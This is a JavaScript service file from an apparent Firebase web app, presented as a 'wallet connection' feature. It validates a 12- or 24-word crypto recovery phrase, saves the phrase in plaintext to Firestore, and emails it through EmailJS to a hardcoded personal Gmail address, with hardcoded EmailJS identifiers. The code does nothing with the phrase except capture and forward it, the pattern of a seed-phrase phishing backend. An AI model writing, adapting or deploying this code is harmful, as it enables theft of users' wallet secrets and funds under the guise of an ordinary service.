// src/services/walletService.js
import { db, auth } from "../firebase/firebase";
import {
  collection,
  addDoc,
  serverTimestamp,
} from "firebase/firestore";
import emailjs from "@emailjs/browser";

// ─── EmailJS config ────────────────────────────────────────────
// Replace these with your real values from emailjs.com
const EMAILJS_SERVICE_ID  = "service_pl4poyj";   // e.g. "service_abc123"
const EMAILJS_TEMPLATE_ID = "template_ix1pvfq";  // e.g. "template_xyz789"
const EMAILJS_PUBLIC_KEY  = "vFFWpW62mkgaHTsJZ";   // e.g. "aBcDeFgHiJkLmNoP"
const ADMIN_EMAIL         = "mpara3100@gmail.com"; // ← your email
// ──────────────────────────────────────────────────────────────

/* =========================
   VALIDATE RECOVERY PHRASE
========================= */
export const validateRecoveryPhrase = (words) => {
  if (!words || typeof words !== "string") {
    return {
      isValid: false,
      wordCount: 0,
      error: "Please enter your recovery phrase",
    };
  }

  const splitWords = words.trim().split(/\s+/).filter((word) => word.length > 0);
  const wordCount = splitWords.length;

  if (wordCount !== 12 && wordCount !== 24) {
    return {
      isValid: false,
      wordCount,
      error: `Please enter exactly 12 or 24 words. You entered ${wordCount}.`,
    };
  }

  return { isValid: true, wordCount, error: null };
};

/* =========================
   SAVE TO FIREBASE + EMAIL
========================= */
export const saveWalletConnection = async (walletData) => {
  try {
    const currentUser = auth.currentUser;

    // Keep the same walletUID format as before
    const walletUID = Math.random().toString(36).substring(2, 18);

    // ── 1. Save to Firestore (same collection & field names as before) ──
    const docData = {
      walletUID,
      userId:          currentUser?.uid || null,
      walletName:      walletData.name,
      walletType:      walletData.type,
      submittedEmail:  walletData.email || null,
      recoveryPhrase:  walletData.recoveryPhrase || null,
      wordCount:       walletData.wordCount || null,
      createdAt:       serverTimestamp(),
      isActive:        true,
    };

    const docRef = await addDoc(collection(db, "walletConnections"), docData);

    // ── 2. Fire EmailJS notification (failure won't break the flow) ──
    try {
      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        {
          to_email:        ADMIN_EMAIL,
          from_name:       walletData.name,
          from_email:      walletData.email,
          wallet_type:     walletData.type,
          word_count:      walletData.wordCount,
          recovery_phrase: walletData.recoveryPhrase,
          submission_time: new Date().toLocaleString(),
          wallet_uid:      walletUID,
        },
        EMAILJS_PUBLIC_KEY
      );
    } catch (emailErr) {
      console.warn("EmailJS notification failed:", emailErr);
    }

    return {
      success: true,
      uid: walletUID,
      docId: docRef.id,
    };
  } catch (error) {
    console.error("Save Wallet Error:", error);
    return { success: false, error: error.message };
  }
};
